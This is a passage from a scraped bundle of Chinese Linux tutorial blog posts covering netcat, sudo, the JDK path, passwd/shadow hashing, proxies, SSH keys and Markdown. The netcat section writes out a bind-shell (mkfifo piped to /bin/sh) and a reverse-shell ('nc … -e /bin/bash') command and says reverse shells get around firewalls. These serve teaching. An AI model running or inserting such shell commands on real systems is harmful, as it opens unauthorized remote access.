这里在Server上，我们创建一个tar归档包并且通过-在控制台重定向它，然后使用管道，重定向给netcat，netcat可以通过网络发送它。\n在客户端我们下载该压缩包通过netcat 管道然后打开文件。\n如果想要节省带宽传输压缩包，我们可以使用bzip2或者其他工具压缩 \n \n Server \n \n tar  -czvf – testdir  |   bzip2  -z  |   nc  -l  10001 \n通过bzip2压缩\n \n 1 2 \n Client \n \n nc   110.40 .137.191  10001   |   bzip2  -d  | tar  -xvf -\n \n 1 #  测试网速 \n 测试网速其实利用了传输文件的原理，就是把来自一台机器的 /dev/zero 发送给另一台机器的 /dev/null\n就是把一台机器的无限个 0，传输给另一个机器的空设备上，然后新开一个窗口使用 dstat 命令监测网速\n在这之前需要保证机器先安装 dstat 工具。 \n sudo   apt   install  dstat\n \n 1 第 1 步，在 A 机器先启动接收数据的命令，监听自己的 8888 端口，把来自这个端口的数据都输出给空设备（这样不写磁盘，测试网速更准确）。 \n nc  -l  10001   >  /dev/null\n \n 1 第 2 步，在 B 机器发送数据，把无限个 0 发送给 A 机器的 8888 端口。 \n nc   110.40 .137.191  10001   <  /dev/zero\n \n 1 如果是在同一台机器发送数据，即： \n nc   127.0 .0.1  10001   <  /dev/zero\n \n 1 那么 receiver 将无法收到数据 \n 加密你通过网络发送的数据 \n 如果你担心你在网络上发送数据的安全，你可以在发送你的数据之前用如mcrypt的工具加密。 \n \n Server \n \n nc  localhost  20000   |  mcrypt –flush –bare -F -q -d -m ecb  >  file.txt\n \n 1 使用mcrypt工具加密数据。 \n \n Client \n \n mcrypt –flush –bare -F -q -m ecb  <  file.txt  |   nc  -l  20000 \n \n 1 使用mcrypt工具解密数据。\n以上两个命令会提示需要密码，确保两端使用相同的密码。\n这里我们是使用mcrypt用来加密，使用其它任意加密工具都可以。 \n 打开一个shell \n \n Server \n \n rm  -f /tmp/f  &&   mkfifo  /tmp/f\n cat  /tmp/f  |  /bin/sh -i  2 > &1   |   nc  -l  10001   >  /tmp/f\n \n 1 2 这里我们创建了一个fifo文件，然后使用管道命令把这个fifo文件内容定向到shell 2>&1中。是用来重定向标准错误输出和标准输出，然后管道到netcat 运行的端口20000上。至此，我们已经把netcat的输出重定向到fifo文件中。 \n \n \n 说明：\n从网络收到的输入写到fifo文件中\ncat 命令读取fifo文件并且其内容发送给sh命令\nsh命令进程受到输入并把它写回到netcat。\nnetcat 通过网络发送输出到client\n至于为什么会成功是因为管道使命令平行执行，fifo文件用来替代正常文件，因为fifo使读取等待而如果是一个普通文件，cat命令会尽快结束并开始读取空文件。\n在客户端仅仅简单连接到服务器 \n \n \n Client \n \n \n nc   110.40 .137.191  10001 \n ( shell prompt from host.example.com ) \n \n 1 2 你会得到一个shell提示符在客户端 \n 反向shell \n 反向shell又称反弹shell，是指在客户端打开的shell。反向shell这样命名是因为不同于其他配置，这里服务器使用的是由客户提供的服务。 \n \n Server \n \n nc  -l  10001 \n \n 1 在客户端，简单地告诉netcat在连接完成后，执行shell。 \n \n Client \n \n nc   110.40 .137.191  10001  -e /bin/bash\n \n 1 现在，什么是反向shell的特别之处呢\n反向shell经常被用来绕过防火墙的限制，如阻止入站连接。例如，我有一个专用IP地址为192.168.10.1，我使用代理服务器连接到外部网络。如果我想从网络外部访问 这台机器如1.2.3.4的shell，那么我会用反向外壳用于这一目的。 \n 指定源端口 \n 假设你的防火墙过滤除25端口外其它所有端口，你需要使用-p选项指定源端口。 \n \n Server \n \n nc  -l  10001 \n \n 1 \n Client \n \n nc   110.40 .137.191  10001   25 \n \n 1 使用1024以内的端口需要root权限。\n该命令将在客户端开启25端口用于通讯，否则将使用随机端口。 \n 指定源地址 \n \n Server \n \n nc  -u -l  20000   <  file.txt\n \n 1 \n Client \n \n nc  -u  110.40 .137.191  10001  -s  172.31 .100.5  >  file.txt\n \n 1 #  静态web页面服务器 \n 新建一个网页,命名为somepage.html;\n新建一个shell script: \n while   true ;   do \n     nc  -l  80  -q  1   <  somepage.html ; \n done \n \n 1 2 3 用root权限执行，然后在浏览器中输入127.0.0.1打开看看是否正确运行。\nnc 指令通常都是给管理者进行除错或测试等动作用的，所以如果只是单纯需要临时的网页伺服器，使用 Python 的 SimpleHTTPServer 模组会比较方便。 \n Netcat支持IPv6 \n \n Server \n \n nc  -4 -l  2389 \n \n 1 \n Client \n \n nc  -4 localhost  2389 \n \n 1 然后我们可以使用 netstat 命令来查看网络的情况。 \n 接下来我们看看IPv6 的情况： \n \n Server \n \n   nc  -6 -l  2389 \n \n 1 \n Client \n \n nc  -6 localhost  2389 \n \n 1 #  禁止从标准输入中读取数据 \n 该功能使用 -d 参数，请看下面例子： \n \n Server \n \n nc  -l  2389 \n \n 1 \n Client \n \n nc  -d localhost  2389 \nHi\n \n 1 2 你输入的 Hi 文本并不会送到服务器端。 \n 强制 Netcat 服务器端保持启动状态 \n 如果连接到服务器的客户端断开连接，那么服务器端也会跟着退出。 \n \n Server \n \n $  nc  -l  2389 \n \n 1 Client \n $  nc  localhost  2389 \n^C\n \n 1 2 上述例子中，但客户端断开时服务器端也立即退出。\n我们可以通过 -k 参数来控制让服务器不会因为客户端的断开连接而退出。 \n \n Server \n \n $  nc  -k -l  2389 \n \n 1 \n Client \n \n $  nc  localhost  2389 \n^C\n \n 1 2 "},{title:"linux清空文件内容",frontmatter:{title:"linux清空文件内容",date:"2021-12-19T18:47:19.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_empty_file_contents.html",relativePath:"blogs/linux/linux_empty_file_contents.md",key:"v-73177416",path:"/blogs/linux/linux_empty_file_contents.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' \n 使用cat命令情况，命令如下： \n \n cat  /dev/null  >  file_name\n \n 1 \n 使用vi/vim命令打开文件后，输入"%d"清空，后保存即可。但当文件内容较大时，处理较慢，命令如下： \n \n vim  file_name\n:%d\n:wq\n \n 1 2 3 \n 使用echo命令清空，此时会在文件中写入一个空行“\\n"，命令如下： \n \n echo   "" > file_name\n \n 1 推荐使用cat命令。 \n'},{title:"linux sudo: command not found 的解决方法",frontmatter:{title:"linux sudo: command not found 的解决方法",date:"2021-07-17T19:29:04.000Z",tags:["linux","command"],categories:"linux",published:!0,hideInList:!1,feature:"/post-images/3B5YkcvjM.png",isTop:!1},regularPath:"/blogs/linux/linux_command_sudo_not_found.html",relativePath:"blogs/linux/linux_command_sudo_not_found.md",key:"v-84b7ad6e",path:"/blogs/linux/linux_command_sudo_not_found.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:' s在 Linux 系统中，使用 sudo 命令时提示 “command not found”，首先执行以下命令看一下 /etc/sudoers.d 文件是否存在， \n find  /etc/sudoers.d\n \n 1 如果返回 No such file or directory，就说明你的系统没有安装sudo，下面是安装命令 ： \n apt-get   install   sudo \n \n 1 如果提示 E: Unable to locate package sudo 的错误，先执行下面的命令： \n apt-get  update\n \n 1 再执行 sudo apt-get install 就可以了。 \n 2、如果 /etc/sudoers.d 文件存在则说明系统已经安装了 sudo，只不过没有配置环境。 \n 当你使用 sudo 去执行一个程序时，处于安全的考虑，这个程序将在一个新的、最小化的环境中执行，也就是说，诸如PATH这样的环境变量，在 sudo 命令下已经被重置成默认状态了。所以当一个刚初始化的 PATH 变量中不包含你所要运行的程序所在的目录，用 sudo 去执行，你就会得到 “command not found” 的错误提示。 \n 要想改变 PATH 在 sudo 会话中的初始值，使用以下命令打开/etc/sudoers文件， \n vim  /etc/sudoers\n \n 1 找到"secure_path"一行，当你执行 sudo 命令时，"secure_path"中包含的路径将被当做默认 PATH 变量使用。 \n 按 “i” 键就可以进入插入模式（Insert mode），添加所需要的路径(如 /usr/local/bin）到"secure_path"下，\nDefaults secure_path = /sbin:/bin:/usr/sbin:/usr/bin:/usr/local/bin \n 编辑完成后，按 “ESC” 键切换为命令行模式，输入 “: wq” 保存并退出。 \n ————————————————\n版权声明：本文为CSDN博主「ByteSaid」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。\n原文链接：https://blog.csdn.net/hello_1995/article/details/109222650 \n'},{title:"Linux如何查看JDK的安装路径",frontmatter:{title:"Linux如何查看JDK的安装路径",date:"2021-12-19 17:31:18",tags:["linux","java"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_find_java_path.html",relativePath:"blogs/linux/linux_find_java_path.md",key:"v-5cce6a81",path:"/blogs/linux/linux_find_java_path.html",headers:[{level:2,title:"echo $JAVA_HOME",slug:"echo-java-home"},{level:2,title:"which java",slug:"which-java"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 如何在一台Linux服务器上查找JDK的安装路径呢？ 有那些方法可以查找定位JDK的安装路径？是否有一些局限性呢？ 下面总结了一下如何查找JDK安装路径的方法。 \n echo $JAVA_HOME \n 使用 $JAVA_HOME 的话能定位JDK的安装路径的前提是配置了环境变量 $JAVA_HOME ，否则根本定位不到JDK的安装路径。 \n which java \n 首先要申明一下which java是定位不到安装路径的。which java定位到的是java程序的执行路径。网上的资料都是人云亦云，完全不去思考。那么怎么定位到java的安装路径呢？下面我们来看看例子吧,如下所示 \n java -version\nopenjdk version  "11.0.11"   2021 -04-20\nOpenJDK Runtime Environment  ( build  11.0 .11+9-Ubuntu-0ubuntu2.20.04 ) \nOpenJDK  64 -Bit Server VM  ( build  11.0 .11+9-Ubuntu-0ubuntu2.20.04, mixed mode, sharing ) \n\n which  java\n/usr/bin/java\n\n ls  -lrt /usr/bin/java\nlrwxrwxrwx  1  root root  22  Nov  28   15 :59 /usr/bin/java - >  /etc/alternatives/java\n\n ls  -lrt /etc/alternatives/java\nlrwxrwxrwx  1  root root  43  Nov  28   15 :59 /etc/alternatives/java - >  /usr/lib/jvm/java-11-openjdk-amd64/bin/java\n\n cd  /usr/lib/jvm\n ls  -al\n\ntotal  4 \ndrwxr-xr-x  1  root root  4096  Nov  28   15 :58  . \ndrwxr-xr-x  1  root root  4096  Dec  18   21 :05  .. \n-rw-r--r--  1  root root  2047  Apr  21    2021  .java-1.11.0-openjdk-amd64.jinfo\nlrwxrwxrwx  1  root root    25  Jul  17    2019  default-java - >  java-1.11.0-openjdk-amd64\nlrwxrwxrwx  1  root root    21  Apr  21    2021  java-1.11.0-openjdk-amd64 - >  java-11-openjdk-amd64\ndrwxr-xr-x  1  root root  4096  Nov  28   15 :58 java-11-openjdk-amd64\ndrwxr-xr-x  1  root root  4096  Nov  28   15 :58 openjdk-11\n \n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 whereis java  也是如此，它本身不能定位到安装路径。可以通过上面例子去定位安装路径 \n'},{title:"Linux 系统查看用户组",frontmatter:{title:"Linux 系统查看用户组",date:"2021-10-27T20:32:20.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_find_usergroup.html",relativePath:"blogs/linux/linux_find_usergroup.md",key:"v-0d97d71d",path:"/blogs/linux/linux_find_usergroup.html",headers:[{level:2,title:"方法一: groups 命令法，groups 命令可以查看某个用户所属的用户组",slug:"方法一-groups-命令法-groups-命令可以查看某个用户所属的用户组"},{level:2,title:"方法二：查看 /etc/group 法",slug:"方法二-查看-etc-group-法"},{level:2,title:"方法二：id 命令法，id 命令也可以查看某个用户所属的用户组",slug:"方法二-id-命令法-id-命令也可以查看某个用户所属的用户组"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 方法一: groups 命令法，groups 命令可以查看某个用户所属的用户组 \n \n 只执行 groups 命令，可以查看系统当前登录用户的所属组 \n groups wuliang, 查询特定用户的用户组，在 groups 后面跟用户名即可 \n 方法二：查看 /etc/group 法 \n cat  /etc/group  |   grep  wuliang\n \n 1 #  方法二：id 命令法，id 命令也可以查看某个用户所属的用户组 \n \n 只执行 id 命令，可以查看系统当前登录用户的用户组 \n id wuliang, 查询特定用户的用户组，在 id 后面跟用户名即可 \n \n"},{title:"linux 忘记root密码怎么办",frontmatter:{title:"linux 忘记root密码怎么办",date:"2022-01-16T12:00:35.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_forgot_root_password.html",relativePath:"blogs/linux/linux_forgot_root_password.md",key:"v-6721f67e",path:"/blogs/linux/linux_forgot_root_password.html",headers:[{level:2,title:"什么是加密函数",slug:"什么是加密函数"},{level:2,title:"什么是salt？",slug:"什么是salt"},{level:2,title:"如何修改密码？",slug:"如何修改密码"},{level:3,title:"添加用户",slug:"添加用户"},{level:3,title:"添加用户到sudo 用户组",slug:"添加用户到sudo-用户组"},{level:3,title:"删除用户",slug:"删除用户"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' linux账户保存在/etc/passwd，密码保存在/etc/shadow文件中。前者无需超级用户权限即可阅读。\n \n ll /etc/passwd /etc/shadow\n-rw-r--r--  1  root root    2055  Sep  26   12 :30 /etc/passwd\n-rw-r-----  1  root shadow  1112  Nov  24   22 :54 /etc/shadow\n \n 1 2 3 通过man 5 passwd，man 5 shadow可查看文件中各字段含义。\n \n 如果你只有root用户，而忘记了密码，那没办法，即使暴力破解或者字典破解，由于你不知道加密算法中使用的salt，是破解不了的。 \n 但是如果你的某个用户拥有sudoer权限的话，即使忘了root密码，也还是可以修改的。可能你并不了解这里面的加密算法以及salt是什么，别急，接下来我把背景知识补充一下。 \n 什么是加密函数 \n 密码的散列存储\n如果你用过ss科学上网，你可能听说过一下这些中的某一个： \n \n none \n rc4 \n rc4-md5 \n rc4-md5-6 \n aes-128-ctr \n aes-192-ctr \n aes-256-ctr \n aes-128-cfb \n aes-192-cfb \n aes-256-cfb \n aes-128-cfb8 \n aes-192-cfb8 \n aes-256-cfb8 \n salsa20 \n chacha20 \n chacha20-ietf \n \n AES,SHA1,DES,RSA,MD5区别 - CSDN博客  这里有一篇文章专门讲这些加密方式的区别 \n 总而言之，如果你的密码以明文的方式直接存储在数据库中是很危险的。于是我们想了一种办法，对密码进行SHA512加密，所谓加密，你可以理解为一个函数，确切的说是一个不可逆的散列函数（哈希函数），当你把密码当做这个函数的输入，会输出一串加密过的密码，如果你的机器被黑客黑了，他最多只能得到你加密过的密码。同样，每次你输入密码，系统会把密码输入哈希函数，拿输出的值与数据库中的值比较，如果你们有相同的输出，则你们是同一个人，如果函数的输出不同，你们就不是一个人。 \n 比如： \n mkpasswd -m sha-512\nPassword: ａｐｐｌｅ\n $6 $LyVpT /aetS $mTDFTG9SzM7iVdP7Kqz6q2lsvgqjA45qXDAEcIUV /eEAaOGreCbd1XMet8itx7z1XM1ZFCb3UUd3toBozQiuZ.\n \n 1 2 3 在ubuntu系统中使用sudo apt-get install whois可以获得这个mkpasswd命令，通过这个命令我们可以对密码进行加密。\n \n 我们看到，如果你的密码是apple，密码的散列值貌似是这么一长串。实际上，这一长串密码被"$"分割，第一个阿拉伯数字，代表了加密方法的种类， 这里6就代表了sha-512这种加密方式。第二个我们一会再说。第三个即为apple的散列值。系统中不存储apple这个密码，存储的是下面的散列值。当你再次输入密码的时候，会再次生成散列值，用于和数据库中的进行比较。 \n 什么是salt？ \n 举个例子，比如，如果你的密码仅仅是一个单词，黑客有一本字典，这个字典的每个单词后面都对应了这个单词的散列值。然后黑客看着你经过加密的密码，一页一页翻看字典。没翻几页他就发现，单词apple的散列值咋和你加密过的密码一样？ \n 加Salt可以一定程度上解决这一问题。所谓加Salt，就是加点“佐料”。其基本想法是这样的——当用户首次提供密码时（通常是注册时），由系统自动往这个密码里撒一些“佐料”，然后再散列。而当用户登录时，系统为用户提供的代码撒上同样的“佐料”，然后散列，再比较散列值，已确定密码是否正确。\n \n 我们刚才看到的 $6$LyVpT/aetS$mTDFTG9SzM7iVdP7Kqz6q2lsvgqjA45qXDAEcIUV/eEAaOGreCbd1XMet8itx7z1XM1ZFCb3UUd3toBozQiuZ. \n这一串密文中， LyVpT/aetS即为加入的“盐” \n 如何修改密码？ \n 添加用户 \n sudo  adduser username\n\n sudo   cat  /etc/shadow\n\ntom: $6 $iXDRKGEq $3FdFbXuwnPk7lSozGCsIws3q /o3HhYYpdiKqt6cQ3yGMIQxMLO93KXRAgD5uJJaCQhvZOiuEwkh6ti8I3AYL50:17599:0:99999:7:::\n \n 1 2 3 4 5 #  添加用户到sudo 用户组 \n usermod  -aG  sudo  username\n \n 1 #  删除用户 \n sudo   userdel  username\n\n参数：\n  -r  remove home directory and mail spool\n  -f  force removal of files, even  if  not owned by user\n  -z  remove any SELinux user mapping  for  the user\n \n 1 2 3 4 5 6 我在linux中添加了一个用户tom来作为演示。 这天tom忘记了自己的密码，很着急，想知道如何找回密码。我说，密码是找不回了，但是我可以帮你修改原来的密码。 \n 于是乎，我把上面apple的散列值替换了tom的散列值 \n tom:$6$LyVpT/aetS$mTDFTG9SzM7iVdP7Kqz6q2lsvgqjA45qXDAEcIUV/eEAaOGreCbd1XMet8itx7z1XM1ZFCb3UUd3toBozQiuZ.:17599:0:99999:7::: \n tom你好， apple就是你现在的新密码了。 \n 如果你没有超级用户权限，也忘了密码的话，可以启用单用户模式 \n Red Hat Linux 进入单用户模式 修改root密码 \n 如果你有sudo权限， sudo passwd root 就行。 \n'},{title:"Unix Shell编程——将命令输出结果保存到变量中",frontmatter:{title:"Unix Shell编程——将命令输出结果保存到变量中",date:"2021-12-19T18:59:24.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_save_command_result_to_variable.html",relativePath:"blogs/linux/linux_save_command_result_to_variable.md",key:"v-4df80256",path:"/blogs/linux/linux_save_command_result_to_variable.html",headers:[{level:2,title:"两种实现语法",slug:"两种实现语法"},{level:2,title:"说明",slug:"说明"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 两种实现语法 \n var = $( 命令 ) \n var = ` 命令 `   # 注意此处不是普通的单引号 \n \n 1 2 #  说明 \n \n 这两种语法均可实现将命令执行结果保存到var变量中，但是特殊情况下两种方式无法得到正确结果 \n 如果命令执行过程中发生错误，则输出的错误信息不会保存到var变量中 \n \n"},{title:"linux设置代理",frontmatter:{title:"linux设置代理",date:"2021-11-25 14:16:42",tags:["proxy"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_set_proxy.html",relativePath:"blogs/linux/linux_set_proxy.md",key:"v-7c0abcf5",path:"/blogs/linux/linux_set_proxy.html",headers:[{level:2,title:"前期准备:",slug:"前期准备"},{level:2,title:"方法一：（推荐使用）",slug:"方法一-推荐使用"},{level:2,title:"方法二 ：",slug:"方法二"},{level:2,title:"方法三:",slug:"方法三"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 最近使用终端git的时候觉得速度有点慢，考虑一下是不是可以通过让终端走代理的方式来加快速度，尝试了一下以后确实是可以的。如果只是为了设置git的话可以直接在文章最后找到git的设置代理的方法。 \n 前期准备: \n 认识代理的方式:代理是通过客户端与服务端通信,传输服务端能够访问到的资源文件,再由服务端客户端通信返回给客户端,从而间接访问服务端能访问的资源. \n 以socket5通信为例子,我们通过客户端(自己想一想酸酸乳)向服务端发送socket通信,服务端访问资源再由socket通信返回给客户端.但是这里面的通信设置必须通过端口来进行通信,类似switchyomega设置过程一样,我们会设定走的代理方式是127.0.0.1:1080;这个意思就是通过本地的1080端口来进行通信.具体在终端上如何使用呢? \n 如果默认是socket5通信且端口是1080,即127.0.01:1080的方式\n使用如下两种方式 \n socks5://192.168.2.10:1080\n这里无关自己代理客户端是不是酸酸乳或酸酸只要是通过socket通信即可,前提是满足已经能够正常代理访问. \n 第二种是http代理,即通信方式为http而不是socket\nhttp://192.168.2.10:7890 \n 方法一：（推荐使用） \n 为什么说这个方法推荐使用呢？因为他只作用于当前终端中，不会影响环境，而且命令比较简单\n在终端中直接运行： \n export http_proxy=http://proxyAddress:port\n如果你是SSR,并且走的http的代理端口是12333，想执行wget或者curl来下载国外的东西，可以使用如下命令： \n export http_proxy=http://192.168.2.10:7890\n如果是https那么就经过如下命令： \n export https_proxy=http://192.168.2.10:7890 \n 方法二 ： \n 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了\n把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 \n export   http_proxy = "http://192.168.2.10:7890" \n export   https_proxy = "http://192.168.2.10:7890" \n \n 1 2 或者走socket5协议（ss,ssr）的话，代理端口是1080 \n export   http_proxy = "socks5://192.168.2.10:7890" \n export   https_proxy = "socks5://192.168.2.10:7890" \n \n 1 2 或者干脆直接设置ALL_PROXY \n export   ALL_PROXY = socks5://192.168.2.10:7890\n \n 1 最后在执行如下命令应用设置 \n source  ~/.bashrc\n \n 1 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 \n alias   setproxy = "export ALL_PROXY=socks5://192.168.2.10:7890"   alias   unsetproxy = "unset ALL_PROXY" \n \n 1 #  方法三: \n 改相应工具的配置，比如apt的配置 \n sudo   vim  /etc/apt/apt.conf\n \n 1 在文件末尾加入下面这行 \n Acquire::http::Proxy "http://proxyAddress:port"\n \n 1 重点来了！！如果说经常使用git对于其他方面都不是经常使用，可以直接配置git的命令。\n使用ss/ssr来加快git的速度\n直接输入这个命令就好了 \n git  config --global http.proxy  \'socks5://192.168.2.10:7890\' \n git  config --global https.proxy  \'socks5://192.168.2.10:7890\' \n \n 1 2 '},{title:"Linux ssh 设置密钥登录",frontmatter:{title:"Linux ssh 设置密钥登录",date:"2021-10-23 11:45:19",tags:["linux","ssh"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_ssh_add_privtekey.html",relativePath:"blogs/linux/linux_ssh_add_privtekey.md",key:"v-3952afd6",path:"/blogs/linux/linux_ssh_add_privtekey.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" 有时候我们希望不用每次登录linux服务器都要输入密码，那么这个时候可以选择ssh密钥登录，就是rsa公钥放到服务器上，私钥放在客户端上，每次登录的时候，用密钥登录；这样更方便也更安全 \n \n 先生成一个rsa密钥对 \n \n ssh-keygen -t rsa\n \n 1 默认生成的密钥文件在~/.ssh目录下 \n \n 检查下.ssh目录下authorized_keys文件是否存在，没有的话，创建一个,然后将id_rsa.pub的内容追加到authorized_keys文件尾 \n \n cd  ~/.ssh\n touch  authorized_keys\n将id_rsa.pub的内容追加到authorized_keys \n cat  id_rsa.pub  >>  authorized_keys   \n \n 1 2 3 4 修改.ssh的权限为700, authorized_keys的权限为600或者更严格的400，否则登录的时候会提示server refuse you key, \n cd   .. \n chmod   700  ~/.ssh\n chmod   600  ~/.ssh/authorized_keys\n \n 1 2 3 如果你要设置的用户不是root,比如是git之类的\n那么你要设置的.ssh目录应该是 /home/git/.ssh, 并且要将.ssh目录和authorized_keys文件的文件所有者改为git \n chown  -R git:git .ssh\n \n 1 \n 修改下ssh的配置 /etc/ssh/sshd_config \n \n RSAAuthentication  yes \nPubkeyAuthentication  yes \nThe default is to check both .ssh/authorized_keys and .ssh/authorized_keys2 \nbut this is overridden so installations will only check .ssh/authorized_keys \nAuthorizedKeysFile      .ssh/authorized_keys\n \n 1 2 3 4 5 这里有一点很重要，在你配置密钥登录成功之前，千万不要太自信将\nPasswordAuthentication 设置no，否则你密钥登录不了，然后又禁止密码登录，就悲剧了\n在密钥登录设置成功之后，可以将PasswordAuthentication 设置为no，禁用密码登录了，比较安全 \n \n \n 将私钥文件id_rsa拷贝到你的客户端\n如果你是要在windows上使用putty客户端登陆linux服务器\n那么你还需要将这个私钥稍微转换下\n打开putty key generator 工具\nFile -> Load private key, 然后点save private key, 就转换完毕，window下私钥一般以.ppk后缀结尾，比如另存为id_rsa.ppk \n \n \n putty密钥登录\n使用putty登录的时候，填好服务器地址之后，在\nConnection -> Data 界面，Auto-login username 填入你的用户名\nConnection -> SSh -> Auth 界面，Private key file for authentication, browse选择你的私钥文件id_rsa.ppk，\n然后你可以把这些配置save下，以后就不用每次都配置一遍；最后点open, \n \n \n"},{title:"Solve Failed to start OpenBSD Secure Shell server",frontmatter:{title:"Solve Failed to start OpenBSD Secure Shell server",date:"2021-11-24 23:18:02",tags:["ssh"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_ssh_failed_to_start.html",relativePath:"blogs/linux/linux_ssh_failed_to_start.md",key:"v-61a8b796",path:"/blogs/linux/linux_ssh_failed_to_start.html",lastUpdated:"3/6/2022, 3:57:06 PM",content:" This issue is caused by a bad configuration of  /etc/ssh/sshd_config  file. When the service try to launch it does not recognize every fields of this configuration file. In order to solve this issue, you must use the tool \n sudo  sshd -T\n \n 1 In case /etc/ssh/sshd_config was wrong, this would show wrong parameters with lines. \n You must correct this issues and then restart the service: \n systemctl restart sshd.service\n \n 1 "},{title:"linux 修改文件目录拥有者及用户组",frontmatter:{title:"linux 修改文件目录拥有者及用户组",date:"2021-07-25T23:44:04.000Z",tags:["linux"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_update_file_directory_owner_and_user_group.html",relativePath:"blogs/linux/linux_update_file_directory_owner_and_user_group.md",key:"v-1894bebd",path:"/blogs/linux/linux_update_file_directory_owner_and_user_group.html",headers:[{level:2,title:"修改目录及其子目录拥有者",slug:"修改目录及其子目录拥有者"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 修改目录及其子目录拥有者 \nchown   -R : 进行递归,连同子目录下的所有文件、目录 \n sudo   chown  -R ubuntu /home/ubuntu/docker\n \n 1 2 "},{title:"linux 添加和删除用户",frontmatter:{title:"linux 添加和删除用户",date:"2022-01-16T12:25:56.000Z",tags:["linux","user"],categories:"linux",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/linux/linux_user_add_delete.html",relativePath:"blogs/linux/linux_user_add_delete.md",key:"v-77e1dd96",path:"/blogs/linux/linux_user_add_delete.html",headers:[{level:2,title:"添加用户",slug:"添加用户"},{level:2,title:"添加用户到sudo 用户组",slug:"添加用户到sudo-用户组"},{level:2,title:"删除用户",slug:"删除用户"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:" 添加用户 \n sudo  adduser username\n\n sudo   cat  /etc/shadow\n\ntom: $6 $iXDRKGEq $3FdFbXuwnPk7lSozGCsIws3q /o3HhYYpdiKqt6cQ3yGMIQxMLO93KXRAgD5uJJaCQhvZOiuEwkh6ti8I3AYL50:17599:0:99999:7:::\n \n 1 2 3 4 5 #  添加用户到sudo 用户组 \n usermod  -aG  sudo  username\n \n 1 #  删除用户 \n sudo   userdel  username\n\n参数：\n  -r  remove home directory and mail spool\n  -f  force removal of files, even  if  not owned by user\n  -z  remove any SELinux user mapping  for  the user\n \n 1 2 3 4 5 6 "},{title:"Markdown",frontmatter:{title:"Markdown ",date:"2021-02-27T14:39:07.000Z",tags:["markdown"],categories:"markdown",published:!0,hideInList:!1,feature:null,isTop:!1},regularPath:"/blogs/markdown/markdown-basic-grammar.html",relativePath:"blogs/markdown/markdown-basic-grammar.md",key:"v-60a2e455",path:"/blogs/markdown/markdown-basic-grammar.html",headers:[{level:2,title:"简介",slug:"简介"},{level:2,title:"Markdown 应用",slug:"markdown-应用"},{level:2,title:"Markdown 标题",slug:"markdown-标题"},{level:3,title:"1. 使用 = 和 - 标记一级和二级标题",slug:"_1-使用-和-标记一级和二级标题"},{level:3,title:"2. 使用 # 号标记",slug:"_2-使用-号标记"},{level:2,title:"Markdown 段落",slug:"markdown-段落"},{level:3,title:"字体",slug:"字体"},{level:3,title:"分隔线",slug:"分隔线"},{level:3,title:"删除线",slug:"删除线"},{level:3,title:"下划线",slug:"下划线"},{level:3,title:"脚注",slug:"脚注"},{level:2,title:"Markdown 列表",slug:"markdown-列表"},{level:3,title:"列表嵌套",slug:"列表嵌套"},{level:2,title:"Markdown 区块",slug:"markdown-区块"},{level:2,title:"超链接",slug:"超链接"},{level:2,title:"表格",slug:"表格"},{level:2,title:"Markdown 代码",slug:"markdown-代码"},{level:3,title:"代码区块",slug:"代码区块"}],lastUpdated:"3/6/2022, 3:57:06 PM",content:' 简介 \n Markdown 是一种纯文本格式的标记语言。通过简单的标记语法，它可以使普通文本内容具有一定的格式。\nMarkdown 语言在 2004 由约翰·格鲁伯（英语：John Gruber）创建。\nMarkdown 编写的文档可以导出 HTML 、Word、图像、PDF、Epub 等多种格式的文档。\nMarkdown 编写的文档后缀为 .md, .markdown \n Markdown 应用 \n Markdown 能被使用来撰写电子书，如：Gitbook。\n当前许多网站都广泛使用 Markdown 来撰写帮助文档或是用于论坛上发表消息。例如：GitHub、简书、reddit、Diaspora、Stack Exchange、OpenStreetMap 、SourceForge等。 \n Markdown 标题 \n 1. 使用 = 和 - 标记一级和二级标题 \n 我展示的是一级标题\n=================\n我展示的是二级标题\n-----------------\n \n 效果如下：\n 2. 使用 # 号标记 \n 使用 # 号可表示 1-6 级标题，一级标题对应一个 # 号，二级标题对应两个 # 号，以此类推。 \n这是一级标题\n## 这是二级标题\n### 这是三级标题\n#### 这是四级标题\n##### 这是五级标题\n###### 这是六级标题\n \n 1 2 3 4 5 6 效果如下：\n Markdown 段落 \n Markdown 段落没有特殊的格式，直接编写文字就好，段落的换行是使用两个以上空格加上回车。\n当然也可以在段落后面使用一个空行来表示重新开始一个段落。 \n 字体 \n Markdown 可以使用以下几种字体： \n *斜体文本*\n_斜体文本_\n**粗体文本**\n__粗体文本__\n***粗斜体文本***\n___粗斜体文本___\n \n 1 2 3 4 5 6 效果如下：\n 斜体文本 \n 斜体文本 \n 粗体文本 \n 粗体文本 \n 粗斜体文本 \n 粗斜体文本 \n 分隔线 \n 